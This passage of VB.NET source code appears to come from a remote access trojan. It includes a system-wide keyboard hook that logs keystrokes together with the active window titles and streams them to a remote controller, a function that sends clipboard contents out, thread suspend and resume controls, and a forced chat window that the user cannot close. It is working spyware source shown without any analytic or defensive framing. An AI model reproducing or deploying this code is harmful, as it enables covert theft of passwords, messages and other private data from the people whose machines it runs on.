        SET_THREAD_TOKEN = (&H80)
        IMPERSONATE = (&H100)
        DIRECT_IMPERSONATION = (&H200)
    End Enum
    Public Function handle(ByVal ThreadID As Integer) As IntPtr
        Return OpenThread(ThreadAccess.SUSPEND_RESUME, False, ThreadID)
    End Function
    Public Function ResumeProcess(ByVal ThreadHandle As IntPtr) As Integer
        Return ResumeThread(ThreadHandle)
    End Function
    <DllImport("kernel32.dll")> Private Function ResumeThread(ByVal hThread As IntPtr) As Integer
    End Function
    Public Function SuspendProcess(ByVal ThreadHandle As IntPtr) As Integer
        Return SuspendThread(ThreadHandle)
    End Function
    <DllImport("Kernel32.dll")> Private Function SuspendThread(ByVal hThread As IntPtr) As Int32
    End Function
    Private Sub LogKeys(ByVal Key As String) Handles K.Down
        If WinText <> GetActiveWindowTitle() Then
            If Not keylogs = "" Then
                keylogs &= vbNewLine & vbNewLine & "[------------" & GetActiveWindowTitle() & "------------]" & vbNewLine
                If liveKeystrokeCapture Then
                    Send("Keylogs|" & newLine & newLine & "[------------" & GetActiveWindowTitle() & "------------]" & newLine)
                End If
            Else
                keylogs &= "[------------" & GetActiveWindowTitle() & "------------]" & vbNewLine
                If liveKeystrokeCapture Then
                    Send("Keylogs|[------------" & GetActiveWindowTitle() & "------------]" & newLine)
                End If
            End If
            WinText = GetActiveWindowTitle()
        End If
        keylogs += Key
        If liveKeystrokeCapture Then
            Send("Keylogs|" & Key.Replace(vbNewLine, newLine))
        End If
    End Sub
    Private Function GetActiveWindowTitle() As String
        Dim MyStr As String
        MyStr = New String(Chr(0), 100)
        GetWindowText(GetForegroundWindow, MyStr, 100)
        MyStr = MyStr.Substring(0, InStr(MyStr, Chr(0)) - 1)
        Return MyStr
    End Function
    Sub StartChat()
        chat = New System.Windows.Forms.Form With {.Text = "", .MinimizeBox = False, .MaximizeBox = False, .FormBorderStyle = FormBorderStyle.FixedSingle, .ShowIcon = False, .ShowInTaskbar = False, .Size = New System.Drawing.Point(400, 350), .StartPosition = FormStartPosition.CenterScreen}
        Textbox1 = New Windows.Forms.TextBox With {.Multiline = True, .Size = New System.Drawing.Point(370, 269), .BorderStyle = BorderStyle.FixedSingle, .Location = New System.Drawing.Point(12, 12), .ReadOnly = True, .BackColor = Color.White}
        Textbox2 = New Windows.Forms.TextBox With {.Size = New Size(New System.Drawing.Point(289, 20)), .BorderStyle = BorderStyle.FixedSingle, .Location = New System.Drawing.Point(12, 290)}
        Button1 = New Windows.Forms.Button With {.Text = "Send", .Location = New System.Drawing.Point(307, 287)}
        AddHandler chat.FormClosing, AddressOf FormClosing
        AddHandler Textbox1.TextChanged, AddressOf TextChanged
        AddHandler Button1.Click, AddressOf ButtonClick
        chat.Controls.Add(Textbox1)
        chat.Controls.Add(Textbox2)
        chat.Controls.Add(Button1)
        Application.Run(chat)
    End Sub
    Sub FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs)
        e.Cancel = True
    End Sub
    Sub TextChanged(ByVal sender As Object, ByVal e As System.EventArgs)
        Textbox1.SelectionStart = Textbox1.TextLength
        Textbox1.ScrollToCaret()
    End Sub
    Sub ButtonClick(ByVal sender As System.Object, ByVal e As System.EventArgs)
        If Textbox2.Text.Replace(" ", "") = "" Then
            Exit Sub
        End If
        Send("Chat|" & Textbox2.Text)
        Textbox1.Text += "[" & TimeOfDay & "] You: " & vbNewLine & Textbox2.Text & vbNewLine & vbNewLine
        Textbox2.Clear()
    End Sub
    Delegate Sub ChatTextDelegate(ByVal text As String)
    Sub ChatText(ByVal text As String)
        If Textbox1.InvokeRequired Then
            Textbox1.Invoke(New ChatTextDelegate(AddressOf ChatText), text)
        Else
            Textbox1.Text &= text
        End If
    End Sub
    Sub GetClipboard()
        Send("Clipboard|" & My.Computer.Clipboard.GetText.Replace(vbNewLine, newLine))
    End Sub
    Sub SetClipboard(ByVal text As String)
        My.Computer.Clipboard.SetText(text)
    End Sub
    Sub ClearClipboard()
        My.Computer.Clipboard.Clear()
    End Sub
End Module

Public Class Keyboard
    Private Declare Function SetWindowsHookEx Lib "user32" Alias "SetWindowsHookExA" (ByVal Hook As Integer, ByVal KeyDelegate As KDel, ByVal HMod As Integer, ByVal ThreadId As Integer) As Integer
    Private Declare Function CallNextHookEx Lib "user32" Alias "CallNextHookEx" (ByVal Hook As Integer, ByVal nCode As Integer, ByVal wParam As Integer, ByRef lParam As KeyStructure) As Integer
    Private Declare Function UnhookWindowsHookEx Lib "user32" Alias "UnhookWindowsHookEx" (ByVal Hook As Integer) As Integer
    Private Delegate Function KDel(ByVal nCode As Integer, ByVal wParam As Integer, ByRef lParam As KeyStructure) As Integer
    Public Shared Event Down(ByVal Key As String)
    Public Shared Event Up(ByVal Key As String)
    Private Shared Key As Integer
    Private Shared KHD As KDel
    Private Structure KeyStructure : Public Code As Integer : Public ScanCode As Integer : Public Flags As Integer : Public Time As Integer : Public ExtraInfo As Integer : End Structure
    Public Sub CreateHook()
        KHD = New KDel(AddressOf Proc)
        Key = SetWindowsHookEx(13, KHD, System.Runtime.InteropServices.Marshal.GetHINSTANCE(System.Reflection.Assembly.GetExecutingAssembly.GetModules()(0)).ToInt32, 0)
    End Sub

    Private Function Proc(ByVal Code As Integer, ByVal wParam As Integer, ByRef lParam As KeyStructure) As Integer
        If (Code = 0) Then
            Select Case wParam
                Case &H100, &H104 : RaiseEvent Down(Feed(CType(lParam.Code, Keys)))
                Case &H101, &H105 : RaiseEvent Up(Feed(CType(lParam.Code, Keys)))
            End Select
        End If
        Return CallNextHookEx(Key, Code, wParam, lParam)
    End Function
    Public Sub DiposeHook()
        UnhookWindowsHookEx(Key)
        MyBase.Finalize()
    End Sub
    Private Function Feed(ByVal e As Keys) As String
        Select Case e
            Case 65 To 90
                If Control.IsKeyLocked(Keys.CapsLock) Or (Control.ModifierKeys And Keys.Shift) <> 0 Then
                    Return e.ToString
                Else
                    Return e.ToString.ToLower
                End If
            Case 48 To 57
                If (Control.ModifierKeys And Keys.Shift) <> 0 Then
                    Select Case e.ToString
                        Case "D1" : Return "!"
                        Case "D2" : Return "@"
                        Case "D3" : Return "#"
                        Case "D4" : Return "$"
                        Case "D5" : Return "%"
                        Case "D6" : Return "^"
                        Case "D7" : Return "&"
                        Case "D8" : Return "*"
                        Case "D9" : Return "("
                        Case "D0" : Return ")"
                    End Select
                Else
                    Return e.ToString.Replace("D", Nothing)
                End If
            Case 96 To 105
                Return e.ToString.Replace("NumPad", Nothing)
            Case 106 To 111
                Select Case e.ToString
                    Case "Divide" : Return "/"
                    Case "Multiply" : Return "*"
                    Case "Subtract" : Return "-"
                    Case "Add" : Return "+"
                    Case "Decimal" : Return "."
                End Select
            Case 32
                Return " "
            Case 186 To 222
                If (Control.ModifierKeys And Keys.Shift) <> 0 Then
                    Select Case e.ToString
                        Case "OemMinus" : Return "_"
                        Case "Oemplus" : Return "+"
                        Case "OemOpenBrackets" : Return "{"
                        Case "Oem6" : Return "}"
                        Case "Oem5" : Return "|"
                        Case "Oem1" : Return ":"
                        Case "Oem7" : Return """"
                        Case "Oemcomma" : Return "<"
                        Case "OemPeriod" : Return ">"
                        Case "OemQuestion" : Return "?"
                        Case "Oemtilde" : Return "~"
                    End Select
                Else
                    Select Case e.ToString
                        Case "OemMinus" : Return "-"
                        Case "Oemplus" : Return "="
                        Case "OemOpenBrackets" : Return "["
                        Case "Oem6" : Return "]"
                        Case "Oem5" : Return "\"
                        Case "Oem1" : Return ";"
                        Case "Oem7" : Return "'"
                        Case "Oemcomma" : Return ","
                        Case "OemPeriod" : Return "."
                        Case "OemQuestion" : Return "/"
                        Case "Oemtilde" : Return "`"
                    End Select
                End If
            Case Keys.Return
                Return Environment.NewLine
            Case 160 To 161

            Case Else
                Return "[" + e.ToString + "]"
        End Select
        Return Nothing
    End Function
End Class
<Serializable()> Public Class Data
    Implements ISerializable
    Private data As String
    Private pic As Image
    Private bytes() As Byte
    Public Sub New(ByVal s As String, ByVal p As Image, ByVal b() As Byte)
        data = s : pic = p : bytes = b
    End Sub
    Public Sub New(ByVal info As SerializationInfo, ByVal ctxt As StreamingContext)
        data = DirectCast(info.GetValue("data", GetType(String)), String)
        pic = DirectCast(info.GetValue("image", GetType(Image)), Image)
        bytes = DirectCast(info.GetValue("bytes", GetType(Byte())), Byte())
    End Sub
    Public Sub GetObjectData(ByVal info As SerializationInfo, ByVal ctxt As StreamingContext) Implements ISerializable.GetObjectData
        info.AddValue("data", data) : info.AddValue("image", pic) : info.AddValue("bytes", bytes)
    End Sub
    Public Function GetData() As String
        Return data
    End Function
    Public Function GetImage() As Image
        Return pic
    End Function
    Public Function GetBytes() As Byte()
        Return bytes
    End Function
End Class
Public Class DownloadContainer
    Public identification As Integer = 0
    Public nextPart As Boolean = False
    Public cancel As Boolean = False
    Sub New(ByVal id As Integer)
        identification = id
    End Sub
End Class